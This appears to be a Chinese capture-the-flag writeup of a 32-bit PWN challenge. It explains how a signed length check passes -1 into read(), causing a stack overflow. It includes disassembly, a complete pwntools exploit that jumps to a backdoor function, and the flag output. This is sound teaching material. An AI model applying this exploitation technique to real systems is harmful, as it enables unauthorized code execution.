# 救赎之道 · Writeup（中文版）

- **题目**：救赎之道
- **分类**：PWN · **分值**：300 pts
- **附件**：`pwn`（ELF 32-bit LSB x86，19 KB，动态链接，interpreter 为 `./ld-linux.so.2`，未 strip）、`题干.txt`
- **关键词**：栈溢出 · 有符号比较绕过 · ret2backdoor · 肖申克的救赎
- **最终 flag**：`npusec{llFE_is_coIOr1ul_and_90_1oR_freE}`

---

## 题干

> 救赎之道 / 300 pts
>
> 救赎之道，就在其中
> 你知道，有些鸟儿是注定不会被关在牢笼里的，它们的每一片羽毛都闪耀着自由的光辉。
>
> 实例入口：`ctf.npusec.org.cn:10162`

两句台词均出自《肖申克的救赎》：前者是典狱长诺顿圣经扉页的题字——石锤就藏在挖空的圣经里；后者是瑞德评价安迪的话。题干已经把解法剧透了两遍：**后门藏在二进制里，且它就是你的越狱工具**。

---

## 解题过程

### 第一步：静态侦察——"圣经里的石锤"就是孤儿函数

```text
$ file pwn
pwn: ELF 32-bit LSB executable, Intel 80386, dynamically linked,
     interpreter ./ld-linux.so.2, not stripped

RELRO: Partial RELRO | STACK CANARY: No canary | NX: enabled | PIE: No PIE

080493ce <main>    — 打印剧情 banner，只调用了 dig()
080492e8 <dig>     — 挖隧道：读入"深度"数字，再 read() 一段内容
0804922a <redeem>  — 从未被任何函数调用（孤儿函数 = 后门）
080491e6 <init>    — setbuf 关缓冲
PLT: read / printf / fgets / puts / system / exit / atoi / setbuf
```

两个立即锁定方向的信号：

1. **`redeem` 没有任何调用者**——`main` 只调 `dig`。"救赎之道，就在其中"，后门就藏在程序里，正如石锤藏在圣经里
2. **`system@plt` 出现在导入表**——终点被直接预告

32 位、无 canary、无 PIE、地址固定，教科书栈溢出的全部前置条件齐了。

<!-- 📷 截图位①：checksec/函数清单 终端截图，待复现时补 -->
![截图①：checksec 与函数清单（file + checksec + nm 函数列表）](./screenshots/救赎之道_01_checksec.png)

### 第二步：dig() 漏洞分析——`jle` 放行负数，-1 变无限长 read

```asm
8049330: call   fgets@plt          ; fgets(ebp-0x60, 0x10, stdin) 读一行数字
804933f: call   atoi@plt           ; n = atoi(buf)
8049347: mov    [ebp-0x10], eax    ; n 存为 int
804934a: cmp    DWORD PTR [ebp-0x10], 0x40
804934e: jle    8049364            ; ★ 有符号比较：n <= 64 才放行
...
8049381: push   0x0
8049383: call   read@plt           ; read(0, ebp-0x50, n)  ← n 直传
```

两个致命细节：

1. **有符号比较**：`jle` 是带符号跳转。长度检查本意是"最多挖 64 字节"，但输入 `-1` 时 `-1 <= 64` 成立，直接放行
2. **int 直传 read**：`read` 的第三个参数是 `size_t`（无符号），`-1` 被解释成 `0xFFFFFFFF`（Linux 内核会钳制到 `0x7FFFF000`），等于**无限长读取**，而目标缓冲区只有 `ebp-0x50` 一小块——教科书级栈溢出

程序后面那段"把返回值钳到 [0,0x3f] 再补 `\0`"只是给 `printf("%s")` 收尾用的，不影响溢出。

<!-- 📷 截图位②：dig() 反汇编截图（IDA F5 或 objdump），重点框出 jle 与 read 两行，待复现时补 -->
![截图②：dig() 漏洞反汇编（jle 有符号校验 + read(0, buf, n)）](./screenshots/救赎之道_02_dig_disasm.png)

### 第三步：ret2backdoor——84 字节偏移，一发命中

后门本体：

```asm
0804922a <redeem>:
  ...puts(...)                    ; 打印雨夜爬下水道的剧情 ASCII
80492cf: lea    eax,[ebx-0x1e96]  ; → 0x804a16a = "cat /flag"
80492d6: call   system@plt        ; system("cat /flag")
80492e3: call   exit@plt
```

利用要素齐备：

- **偏移**：缓冲区在 `ebp-0x50`，到返回地址距离 = `0x50 + 4`（saved ebp）= **84 字节**
- **目标**：`redeem` 自带 `ebx` 初始化（`__x86.get_pc_thunk.bx`），跳到函数开头即可干净执行——无需传参、无需栈对齐，`cat /flag` 后 `exit(0)`
- **零 libc 依赖**：`system` 走二进制自身 PLT（懒绑定），无需泄漏、无需版本匹配，题目自带的 `./ld-linux.so.2` 部署细节完全不影响本解法

<!-- 📷 截图位③：redeem() 后门反汇编截图，重点框出 system("cat /flag")，待复现时补 -->
![截图③：redeem() 后门反汇编（system("cat /flag") + exit）](./screenshots/救赎之道_03_redeem_disasm.png)

完整 exploit：

```python
#!/usr/bin/env python3
# 救赎之道 — signed-size bypass + ret2backdoor
from pwn import *

context.arch = 'i386'

REDEEM  = 0x804922a   # orphan backdoor: system("cat /flag")
OFFSET  = 0x50 + 4    # buf(ebp-0x50) -> saved ebp -> ret = 84

io = remote('ctf.npusec.org.cn', 10162)
io.sendline(b'-1')                            # atoi=-1, signed jle passes
io.sendline(b'A' * OFFSET + p32(REDEEM))      # read(0, buf, 0xffffffff)
print(io.recvall(timeout=10).decode('utf-8', 'replace'))
```

远程实弹输出：

```text
墙上留下的凿痕：AAAA...（63 个 A，printf 的 %s 回显）

一个雷雨交加的夜。
你爬过五百码恶臭的下水道，在河水里洗净了满身的污泥。
暴雨砸在你张开的双臂上。那一刻，你终于自由了。

救赎之道，就在其中。
希望是美好的事物，也许是世上最美好的事物，美好的事物永不消逝。
——Get busy living, or get busy dying.
npusec{llFE_is_coIOr1ul_and_90_1oR_freE}
```

**一发命中**（首次尝试即出 flag），远程剧情彩蛋完整走完：凿墙（溢出）→ 爬下水道（控制返回地址）→ 雨中自由（getflag）。flag 的 leet 文本解码为 "life is colorful and go for free"。

<!-- 📷 截图位④：exploit 运行截图（python exp.py 完整输出，含剧情彩蛋与 flag），待复现时补 -->
![截图④：exploit 实弹输出与 flag](./screenshots/救赎之道_04_exploit_flag.png)

---

## 完整攻击链

```
pwn (ELF 32-bit · no canary · no PIE)
  ├─ 侦察：redeem() 孤儿函数 = 圣经里的石锤（内含 system("cat /flag")）
  └─ dig()：
       ├─ fgets→atoi 存 int，jle 有符号校验：-1 <= 64 放行
       ├─ read(0, ebp-0x50, -1→0xFFFFFFFF) → 无限长读 → 栈溢出
       └─ 'A'*84 + p32(redeem) → dig 的 ret → redeem → system("cat /flag") → flag
```

---

## 知识点沉淀

1. **有符号长度校验绕过**：`jle/jg` 是带符号比较，负数永远满足 `n <= 上限`；遇到"输入一个数字当长度"的题，先送 `-1` 探路
2. **int→size_t 符号扩展**：负 `int` 直传 `read/memcpy/strncpy` 的 `size_t` 形参会变成超大无符号数（内核对 read 钳到 `0x7FFFF000`），等价于无界写；修复姿势 `if ((unsigned)n > 0x40) return;`
3. **孤儿函数 = 题目递给你的石锤**：符号未 strip 时先列函数清单找"无调用者"的函数，多半是出题人留的后门，省掉整个 ROP/libc 泄漏流程
4. **32 位栈溢出偏移公式**：buf 在 `ebp-0x50` 时，到 ret 的距离 = `0x50 + 4`（saved ebp 占 4 字节），不要忘了 +4
5. **零 libc 解法优先**：二进制自带 `system@plt` 时，懒绑定让后门自给自足；先找内置后门再考虑 ret2libc

---

## 踩坑记录

- 长度检查用的是 `jle`（带符号）而非 `jb/jbe`（无符号）——一眼扫过去"有长度校验"就跳过的话会漏掉整个题眼，**看比较指令本身，别只看有没有检查**
- WSL2 缺 32 位运行时（`libc6:i386`/`patchelf`/`qemu-i386` 全缺）：本题靠零 libc 依赖直接打远程绕过；下次遇到需要本地调试的 32 位题必须先补环境
- 中文路径传给 `wsl bash -c` 会炸编码，先把二进制 cp 到 ASCII 路径（如 `~/pwn_work`）再操作
